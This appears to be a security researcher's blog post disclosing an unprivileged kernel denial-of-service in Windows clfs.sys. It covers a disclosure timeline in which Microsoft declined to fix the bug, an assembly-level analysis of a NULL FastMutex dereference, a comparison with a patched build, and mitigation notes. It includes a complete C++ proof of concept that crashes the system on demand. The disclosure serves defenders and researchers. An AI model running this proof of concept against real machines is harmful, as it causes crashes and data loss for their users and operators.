---
title: "Won't Fix: Kernel DoS in clfs.sys via NULL FastMutex Dereference"
summary: Unprivileged kernel DoS via NULL pointer dereference in clfs.sys affecting Windows 11/Server 2025, marked "Won't Fix" by Microsoft.
date: 2026-03-16
authors:
  - admin
tags:
  - CVE
  - Microsoft
categories:
  - Windows
---

I was recently deep in the weeds of Windows kernel internals, specifically trying to increase the window for a race condition on a `clfs.sys` CVE. My goal was to call specific functions to lock a file object, essentially forcing internal `clfs.sys` functions to hang just long enough to win the race.

Instead of a successful race win, I stumbled upon a clean, reproducible **Kernel Denial of Service (DoS)**.

This vulnerability affects **Windows 11 24H2/25H2** and **Windows Server 2025** (and likely several preceding versions), even with the latest security patches applied as of March 2026.

## Disclosure Timeline

Despite the stability of the PoC, Microsoft has classified this as Moderate severity, as they do not consider NULL pointer dereferences to be viable Elevation of Privilege (EoP) vectors in modern environments. Microsoft specifically notes that "NULL remapping cannot be exploited in Windows 8+" due to the kernel-mode prevention of mapping the zero page (address 0). Consequently, while the DoS is absolute, the risk of code execution is mitigated by the OS:

* **January 16, 2026:** Initial report submitted to MSRC.
* **January 19, 2026:** Case officially opened for investigation.
* **March 4, 2026:** MSRC concluded: *"This issue does not meet the bar for security servicing."*
* **Status: WON'T FIX**.

## Vulnerability Summary

The issue is a **NULL pointer dereference** in the Windows kernel (`ntoskrnl.exe`). It occurs when the kernel attempts to create a Section Object from a File Object (specifically a CLFS log handle) that lacks a valid Fast Mutex in its [FSRTL_ADVANCED_FCB_HEADER](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_fsrtl_advanced_fcb_header) structure.

While this results in an immediate Blue Screen of Death (BSoD), it is not considered an Elevation of Privilege (EoP) vector. Since Windows 8, Microsoft has implemented strict protections that prevent mapping the NULL page, meaning there is no known way to leverage this for code execution or information leaks.

## Technical Breakdown

To understand why this crash occurs, we first have to look at what [CreateFileMappingW()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-createfilemappingw) does. When you call `CreateFileMappingW()` on a file handle, you are essentially asking the Windows Memory Manager to link a physical file on disk to a virtual memory address. It creates a block of memory (called **Section Object**) that lets processes read, write, or share data through memory instead of slow file or IPC operations.

### From API to Syscall

The call follows this path:

1. **`KERNELBASE!CreateFileMappingW`**: Validates basic parameters (protection flags, size, handle validity).
2. **`ntdll!NtCreateSection`**: The user-mode wrapper that executes the `syscall` instruction to enter kernel mode.
3. **`nt!NtCreateSection`**: The kernel-mode entry point.

### Security and Filter Checks

Inside the kernel, the Memory Manager must ensure that the `FILE_OBJECT` associated with the provided handle is actually capable of being mapped. This is handled by **`nt!MiCreateSection`** and its sub-routines.

Because many drivers (like antivirus or encryption filters) need to know when a file is being mapped into memory, the kernel calls **`nt!MiCallCreateSectionFilters`**. This function’s job is to notify the file system and filters that a section is being created and to synchronize access to the file's control blocks.

### The Synchronization Failure

This is where the vulnerability manifests. To perform these filter notifications safely, the kernel needs to acquire a lock on the file's header to prevent the file state from changing mid-operation.

It retrieves the `FsContext` (which points to an `FSRTL_ADVANCED_FCB_HEADER`) and looks for the `FastMutex` pointer:
```nasm
; nt!MiCallCreateSectionFilters
MOV     RSI, qword ptr [R14 + 0x18]  ; Load FSRTL_ADVANCED_FCB_HEADER
TEST    RSI, RSI
JZ      LAB_14097db82
MOV     RCX, qword ptr [RSI + 0x30]  ; Retrieve FastMutex
CALL    ExAcquireFastMutex           ; Pass FastMutex to the locking routine
```

* **The Expectation:** If a file is being used for a section, it should have a synchronization primitive.
* **The Reality:** As hinted by the documentation of the function [FsRtlSetupAdvancedHeaderEx](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-fsrtlsetupadvancedheaderex) used to create `FSRTL_ADVANCED_FCB_HEADER`: *The fast mutex is optional and can be NULL. If FastMutex is NULL, the caller must explicitly set the FastMutex member of the FSRTL_ADVANCED_FCB_HEADER structure.* And in CLFS `FILE_OBJECT` case, the `FastMutex` hasn't been set at all.

Because `nt!MiCallCreateSectionFilters` assumes the pointer is valid, it passes `0x0` directly to `ExAcquireFastMutex()`.

### The Crash Point

Inside `ExAcquireFastMutex()`, the kernel executes a bit-test-and-reset (`btr`) instruction with a `lock` prefix to acquire the mutex. Since the base address (`rbx`) is `0`, the CPU triggers an access violation.

```nasm
nt!ExAcquireFastMutex+0x38:
lock btr dword ptr [rbx], 0  ; <--- RBX is NULL, resulting in Access Violation
```

## Reproducing the BSoD

The reproduction is quite simple and requires no special privileges:

1. **Obtain a log handle:** Call `CreateLogFile()` to get a handle to a CLFS log.
2. **Trigger the Section creation:** Provide that handle to `CreateFileMappingW()`.
3. **Result:** Immediate `SYSTEM_SERVICE_EXCEPTION (3b)` bugcheck.

PoC below:
```cpp
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <clfsw32.h>

#pragma comment(lib, "Clfsw32.lib")

int main()
{
    char enter;
    LPCWSTR logname = L"LOG:C:\\Windows\\Temp\\ADoS";
    HANDLE hDevice = CreateLogFile(logname,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        OPEN_ALWAYS,
        0);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to create log file. Error: %lu", GetLastError());
        return 1;
    }
    printf("Handle address: %p\n", hDevice);
    printf("Gonna do some mapping now, press enter to continue to BSoD\n");
    scanf("%c", &enter);
    HANDLE hMap = CreateFileMappingW(hDevice, NULL, PAGE_READWRITE, 0, 4096, NULL);
    if (!hMap) {
        printf("CreateFileMapping failed: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("First CreateFileMapping passed!\n");
    CloseHandle(hMap);
    CloseHandle(hDevice);

    return 0;
}
```

## Suggested Mitigation

A possible fix could be to validate the `FastMutex` pointer in `nt!MiCallCreateSectionFilters`. If it is `NULL`, the kernel should gracefully fail the section creation with an appropriate error code (like `STATUS_INVALID_PARAMETER` or `STATUS_ASSERTION_FAILURE`) instead of blindly attempting to acquire a lock on address `0x0`.

While analyzing the vulnerability, I discovered that the **Windows 11 Insider (26H2)** build is not susceptible to this crash. By comparing the assembly of `nt!MiCallCreateSectionFilters` across both versions, we can see exactly how Microsoft refactored the synchronization logic.

### The Vulnerable Code (25H2 / Server 2025)

In current production builds, the kernel uses a **Software Lock** pattern. It attempts to retrieve a mutex pointer from the file header and pass it to a formal locking routine.

```nasm
; nt!MiCallCreateSectionFilters (Vulnerable)
MOV     RSI, qword ptr [R14 + 0x18]  ; Load FSRTL_ADVANCED_FCB_HEADER
TEST    RSI, RSI
JZ      LAB_14097db82
MOV     RCX, qword ptr [RSI + 0x30]  ; Retrieve FastMutex (NULL for CLFS)
CALL    ExAcquireFastMutex           ; Pass NULL to the locking routine
...
OR      byte ptr [RSI + 0x6], 0x10   ; Flip the bit
CALL    ExReleaseFastMutex
```

When `ExAcquireFastMutex` receives that `NULL` pointer in `RCX`, it eventually hits the following instruction, causing the BSoD:

```nasm
; nt!ExAcquireFastMutex
MOV     RBX, RCX
...
BTR.LOCK dword ptr [RBX], 0x0        ; CRASH: RBX is 0x0 (Access Violation)
```

### The "Hardware Lock" Fix (26H2)

In the 26H2 build, Microsoft eliminated the dependency on the software mutex entirely. Instead of calling a complex synchronization routine, they now use a single **Hardware-level atomic instruction**.

```nasm
; nt!MiCallCreateSectionFilters (Patched in 26H2)
MOV     RAX, qword ptr [RSI + 0x18]  ; Load FSRTL_ADVANCED_FCB_HEADER
TEST    RAX, RAX
JZ      LAB_14095dbb8
LOCK OR byte ptr [RAX + 0x6], 0x10   ; ATOMIC: No pointer dereference needed
JMP     LAB_14095dbb8 
```

### Conclusion on Mitigation

The shift in 26H2 shows another fix alternative: **replacing the software lock with a hardware lock**. Since the kernel only needs to perform a single bitwise `OR` operation, modern CPUs can handle this atomicity via the `LOCK` prefix with extreme efficiency.

Since this is marked as **Won't Fix**, defenders should monitor for unusual `CreateFileMapping()` calls targeting CLFS log files, though preventing this at the API level is difficult without a vendor patch.
